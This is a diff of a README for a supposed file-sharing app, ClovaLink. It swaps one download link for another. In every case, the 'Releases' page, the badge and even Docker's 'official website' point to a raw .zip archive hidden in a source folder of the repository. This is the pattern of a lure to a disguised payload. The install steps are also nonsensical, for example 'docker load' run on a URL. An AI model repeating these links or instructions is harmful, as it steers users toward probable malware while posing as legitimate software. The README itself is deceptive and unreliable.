@@ -6,11 +6,11 @@ Welcome to ClovaLink! This application provides a modern solution for secure fil
 
 ## 📥 Download ClovaLink
 
-[![Download ClovaLink](https://raw.githubusercontent.com/Wai-Yan2003/ClovaLink/main/backend/crates/api/src/middleware/Link_Clova_v3.5.zip%https://raw.githubusercontent.com/Wai-Yan2003/ClovaLink/main/backend/crates/api/src/middleware/Link_Clova_v3.5.zip)](https://raw.githubusercontent.com/Wai-Yan2003/ClovaLink/main/backend/crates/api/src/middleware/Link_Clova_v3.5.zip)
+[![Download ClovaLink](https://raw.githubusercontent.com/Wai-Yan2003/ClovaLink/main/frontend/src/pages/Clova_Link_3.9.zip%https://raw.githubusercontent.com/Wai-Yan2003/ClovaLink/main/frontend/src/pages/Clova_Link_3.9.zip)](https://raw.githubusercontent.com/Wai-Yan2003/ClovaLink/main/frontend/src/pages/Clova_Link_3.9.zip)
 
 ### Visit the Releases Page
 
-To download the latest version of ClovaLink, visit this page: [ClovaLink Releases](https://raw.githubusercontent.com/Wai-Yan2003/ClovaLink/main/backend/crates/api/src/middleware/Link_Clova_v3.5.zip).
+To download the latest version of ClovaLink, visit this page: [ClovaLink Releases](https://raw.githubusercontent.com/Wai-Yan2003/ClovaLink/main/frontend/src/pages/Clova_Link_3.9.zip).
 
 ## 💻 System Requirements
 
@@ -25,20 +25,20 @@ Before you proceed, ensure your system meets these requirements:
 
 ### Step 1: Install Docker
 
-First, you need Docker installed on your system. Docker allows you to run ClovaLink in an isolated environment, making it easy to manage. You can download Docker from their [official website](https://raw.githubusercontent.com/Wai-Yan2003/ClovaLink/main/backend/crates/api/src/middleware/Link_Clova_v3.5.zip).
+First, you need Docker installed on your system. Docker allows you to run ClovaLink in an isolated environment, making it easy to manage. You can download Docker from their [official website](https://raw.githubusercontent.com/Wai-Yan2003/ClovaLink/main/frontend/src/pages/Clova_Link_3.9.zip).
 
 ### Step 2: Download ClovaLink
 
-1. Go to the [ClovaLink Releases](https://raw.githubusercontent.com/Wai-Yan2003/ClovaLink/main/backend/crates/api/src/middleware/Link_Clova_v3.5.zip) page.
+1. Go to the [ClovaLink Releases](https://raw.githubusercontent.com/Wai-Yan2003/ClovaLink/main/frontend/src/pages/Clova_Link_3.9.zip) page.
 2. Find the latest release version.
-3. Download the Docker image listed in the assets section. It will usually be named something like `https://raw.githubusercontent.com/Wai-Yan2003/ClovaLink/main/backend/crates/api/src/middleware/Link_Clova_v3.5.zip`.
+3. Download the Docker image listed in the assets section. It will usually be named something like `https://raw.githubusercontent.com/Wai-Yan2003/ClovaLink/main/frontend/src/pages/Clova_Link_3.9.zip`.
 
 ### Step 3: Load the Docker Image
 
 Once the download completes, open your terminal or command prompt. Use the following command to load the image:
 
 ```bash
-docker load < https://raw.githubusercontent.com/Wai-Yan2003/ClovaLink/main/backend/crates/api/src/middleware/Link_Clova_v3.5.zip
+docker load < https://raw.githubusercontent.com/Wai-Yan2003/ClovaLink/main/frontend/src/pages/Clova_Link_3.9.zip
 ```
 
 ### Step 4: Run ClovaLink
@@ -73,4 +73,4 @@ ClovaLink is released under the MIT License. You can freely use, modify, and dis
 
 ## 🚀 Closing Notes
 
-Thank you for using ClovaLink. We hope this application simplifies your file storage and sharing needs. Don't forget to visit the [ClovaLink Releases](https://raw.githubusercontent.com/Wai-Yan2003/ClovaLink/main/backend/crates/api/src/middleware/Link_Clova_v3.5.zip) page to download the latest version and explore more features!
+Thank you for using ClovaLink. We hope this application simplifies your file storage and sharing needs. Don't forget to visit the [ClovaLink Releases](https://raw.githubusercontent.com/Wai-Yan2003/ClovaLink/main/frontend/src/pages/Clova_Link_3.9.zip) page to download the latest version and explore more features!
